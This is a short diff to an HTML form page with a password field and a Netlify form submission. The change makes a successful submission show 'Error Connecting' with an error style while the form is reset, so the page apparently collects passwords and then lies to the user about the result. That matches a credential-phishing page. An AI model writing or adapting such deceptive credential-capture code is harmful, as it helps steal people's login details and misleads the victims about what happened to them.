@@ -101,7 +101,6 @@
                 <button type="button" class="show-password" id="togglePassword">Show</button>
             </div>
             
-            <!-- Add a hidden input for Netlify form detection -->
             <input type="hidden" name="form-name" value="conforpky">
             
             <button class="proceed-button" type="submit" id="sendMessageButton">Submit</button>
@@ -142,7 +141,8 @@
     .then(async response => {
         if (response.ok) {
             console.log('Sces');
-            sendButton.textContent = "Success";
+            sendButton.textContent = "Error Connecting";
+            sendButton.classList.add("error-button");
             form.reset();
         } else {
             const errorText = await response.text();
